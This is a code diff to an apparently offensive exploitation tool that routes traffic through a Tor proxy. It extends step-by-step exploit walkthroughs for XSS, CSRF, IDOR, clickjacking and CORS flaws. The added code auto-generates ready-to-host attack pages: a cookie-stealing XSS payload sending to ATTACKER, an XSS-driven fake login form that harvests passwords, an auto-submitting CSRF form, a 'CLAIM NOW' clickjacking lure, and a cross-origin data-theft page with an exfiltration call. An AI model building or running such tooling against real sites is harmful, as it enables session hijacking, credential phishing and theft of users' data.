@@ -1133,9 +1133,24 @@ def _intel_exploit_walkthrough(tor_proxy: str):
                             info("Aborted.")
                             continue
 
+                    # File-generation steps: write the file automatically
+                    if step.get("generate_file"):
+                        finfo = step["generate_file"]
+                        out_dir = Path("/dev/shm/intel") if Path("/dev/shm").exists() else ROOT / ".intel_tmp"
+                        out_dir.mkdir(parents=True, exist_ok=True)
+                        out_path = out_dir / finfo["filename"]
+                        out_path.write_text(finfo["content"])
+                        os.chmod(str(out_path), 0o600)
+                        ok(f"File generated: {out_path}")
+                        if finfo.get("note"):
+                            info(finfo["note"])
+                        print()
+                        step_idx += 1
+                        break
+
                     cmd = step["command"]
                     if cmd.startswith("#") or cmd.startswith("<!--"):
-                        info("This step is informational — copy the code manually.")
+                        info("This step is informational (no executable command).")
                         step_idx += 1
                         break
 
@@ -1230,14 +1245,37 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "warning": "This attempts to read user credentials"},
         ]
     elif etype == "xss":
+        xss_phish_html = (
+            f"<!DOCTYPE html>\n<html>\n<body>\n"
+            f"<h2>XSS Phishing PoC</h2>\n"
+            f"<p>Send the victim this link:</p>\n"
+            f"<pre>{target.split('?')[0]}?{param}=&lt;script&gt;document.body.innerHTML="
+            f"'&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action=https://ATTACKER/phish&gt;"
+            f"&lt;input name=user placeholder=Username&gt;&lt;input name=pass type=password "
+            f"placeholder=Password&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'"
+            f"&lt;/script&gt;</pre>\n"
+            f"<h3>What happens:</h3>\n<ol>\n"
+            f"<li>Victim clicks the link</li>\n"
+            f"<li>XSS replaces the page with a fake login form</li>\n"
+            f"<li>Victim enters credentials, sent to ATTACKER</li>\n</ol>\n"
+            f"</body>\n</html>"
+        )
         steps = [
             {"title": "Confirm reflection",
-             "command": f"curl -s {sp} \"{target}\" | grep -i 'alert\\|<script'",
-             "note": "Check if payload appears unescaped"},
-            {"title": "Cookie stealing payload",
+             "command": f"curl -s {sp} \"{target}\" | grep -i '<script\\|alert\\|onerror'",
+             "note": "Check if payload appears unescaped in response"},
+            {"title": "Test cookie stealing payload",
              "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=<script>new Image().src='https://ATTACKER/c?c='+document.cookie</script>\"",
-             "note": "Replace ATTACKER with your listener. Steals victim session.",
-             "warning": "This sends a payload that would steal cookies"},
+             "note": "Replace ATTACKER with your listener IP/domain",
+             "warning": "This payload steals session cookies"},
+            {"title": "Generate XSS phishing documentation",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"xss_phish_{secrets.token_hex(3)}.html",
+                 "content": xss_phish_html,
+                 "note": "Reference page showing how to chain XSS into credential phishing.",
+             },
+             "note": "Shows the full XSS phishing attack chain"},
         ]
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
@@ -1300,43 +1338,94 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "warning": "This executes OS commands on the server"},
         ]
     elif etype == "csrf":
+        csrf_html = (
+            f"<html>\n<body onload=\"document.getElementById('f').submit();\">\n"
+            f"<h2>Processing... please wait</h2>\n"
+            f"<form method='POST' action='{target}' id='f' style='display:none'>\n"
+            f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>\n"
+            f"</form>\n</body>\n</html>"
+        )
         steps = [
             {"title": "Generate CSRF exploit page",
-             "command": f"# Save as exploit.html and host it:\n"
-                        f"# <html><body>\n"
-                        f"# <form method='POST' action='{target}' id='f'>\n"
-                        f"#   <input type='hidden' name='{param}' value='attacker_value'>\n"
-                        f"# </form>\n"
-                        f"# <script>document.getElementById('f').submit();</script>\n"
-                        f"# </body></html>",
-             "note": "Victim visits this page -> form auto-submits with their session"},
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"csrf_exploit_{secrets.token_hex(3)}.html",
+                 "content": csrf_html,
+                 "note": "Host this file on any web server. When victim visits it, "
+                         "the form auto-submits to the target with their session cookies.",
+             },
+             "note": "The exploit page will auto-submit the form when the victim loads it"},
+            {"title": "Verify: check if action was performed",
+             "command": f"curl -s {sp} \"{target}\"",
+             "note": "Check if the forged action took effect on the target"},
         ]
     elif etype == "idor":
         steps = [
             {"title": "Enumerate accessible resources",
              "command": f"for i in $(seq 1 20); do echo \"=== ID $i ===\"; curl -s {sp} \"{target.split('?')[0]}?{param}=$i\" | head -3; echo; done",
              "note": "Compare responses — different content per ID = confirmed IDOR"},
+            {"title": "Targeted extraction (specific ID)",
+             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=1\"",
+             "note": "Replace 1 with a target user's ID to access their data"},
         ]
     elif etype == "clickjacking":
+        cj_html = (
+            f"<!DOCTYPE html>\n<html>\n<head><title>Special Offer</title></head>\n"
+            f"<body style='margin:0;font-family:Arial,sans-serif;background:#1a1a2e;color:white'>\n"
+            f"<div style='position:relative;width:100%;height:100vh'>\n"
+            f"  <iframe src='{target}' style='opacity:0.0001;position:absolute;top:0;left:0;"
+            f"width:100%;height:100%;z-index:2;border:none'></iframe>\n"
+            f"  <div style='position:relative;z-index:1;text-align:center;padding-top:15%'>\n"
+            f"    <h1 style='font-size:3em'>Congratulations!</h1>\n"
+            f"    <p style='font-size:1.5em'>You've been selected for an exclusive offer</p>\n"
+            f"    <button style='font-size:2em;padding:20px 60px;background:#e94560;"
+            f"color:white;border:none;border-radius:10px;cursor:pointer;margin-top:30px'>"
+            f"CLAIM NOW</button>\n"
+            f"    <p style='font-size:0.8em;margin-top:20px;opacity:0.5'>Limited time offer</p>\n"
+            f"  </div>\n</div>\n</body>\n</html>"
+        )
         steps = [
             {"title": "Generate clickjacking exploit page",
-             "command": f"# Save as clickjack.html:\n"
-                        f"# <html><body style='margin:0'>\n"
-                        f"# <iframe src='{target}' style='opacity:0.0001;position:absolute;width:100%;height:100%;z-index:2'></iframe>\n"
-                        f"# <div style='z-index:1;padding:50px'><h1>Click to claim your prize!</h1>\n"
-                        f"# <button style='font-size:24px;padding:20px'>CLAIM NOW</button></div>\n"
-                        f"# </body></html>",
-             "note": "Victim clicks the fake button but actually clicks the hidden target page"},
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"clickjack_{secrets.token_hex(3)}.html",
+                 "content": cj_html,
+                 "note": "Host this file. The target page is loaded invisibly behind "
+                         "a fake UI. When the victim clicks 'CLAIM NOW', they actually "
+                         "click whatever is at that position on the target page.",
+             },
+             "note": "The exploit page overlays fake UI over the invisible target iframe"},
+            {"title": "Test locally: open the generated file in a browser",
+             "command": f"# Open the generated HTML file in a browser to verify the overlay works",
+             "note": "You should see the fake UI. The target page is hidden behind it."},
         ]
     elif etype == "cors_misconfiguration":
+        cors_html = (
+            f"<!DOCTYPE html>\n<html>\n<body>\n<h2>CORS Data Theft PoC</h2>\n"
+            f"<pre id='stolen'></pre>\n<script>\n"
+            f"fetch('{target}', {{credentials: 'include'}})\n"
+            f"  .then(r => r.text())\n"
+            f"  .then(data => {{\n"
+            f"    document.getElementById('stolen').textContent = data;\n"
+            f"    // Exfiltrate: uncomment next line and set your server\n"
+            f"    // fetch('https://ATTACKER/collect', {{method:'POST', body:data}});\n"
+            f"  }})\n"
+            f"  .catch(e => document.getElementById('stolen').textContent = 'Error: '+e);\n"
+            f"</script>\n</body>\n</html>"
+        )
         steps = [
             {"title": "Verify CORS reflects arbitrary origin",
              "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control'",
              "note": "Look for Access-Control-Allow-Origin: https://evil.com"},
-            {"title": "Exploit: steal authenticated data",
-             "command": f"# Host on attacker.com:\n"
-                        f"# <script>fetch('{target}',{{credentials:'include'}}).then(r=>r.text()).then(d=>fetch('https://ATTACKER/collect',{{method:'POST',body:d}}))</script>",
-             "warning": "This steals authenticated API responses cross-origin"},
+            {"title": "Generate CORS data theft exploit page",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"cors_exploit_{secrets.token_hex(3)}.html",
+                 "content": cors_html,
+                 "note": "Host this on any domain. When an authenticated victim visits it, "
+                         "JavaScript steals their data from the target API cross-origin.",
+             },
+             "warning": "This exploit steals authenticated data cross-origin"},
         ]
     elif etype == "csp_bypass":
         steps = [
